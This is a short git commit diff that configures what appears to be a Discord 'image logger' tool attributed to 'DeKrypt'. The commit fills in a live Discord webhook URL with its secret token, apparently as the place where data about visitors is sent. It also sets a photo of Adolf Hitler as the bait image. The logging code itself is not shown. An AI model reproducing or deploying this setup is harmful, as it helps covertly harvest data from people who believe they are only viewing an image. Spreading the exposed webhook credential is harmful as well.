12b6641b6bc8dff72b997cff27ff4638e00663cc
sneakymoose12 <aaronjos17juli@gmail.com>
2025-02-09 15:04:41 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1338147940165877770/akwZPtPzxUyAlGDxYiLrcnGNMurtLGNfJ-HUHX6KrW0AbSE7J79NkGzndAG1z4uxZSYr",
+    "image": "https://www.planet-wissen.de/geschichte/diktatoren/adolf_hitlers_lebensweg/adolf-hitler-hindenburg-100~_v-gseagaleriexl.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
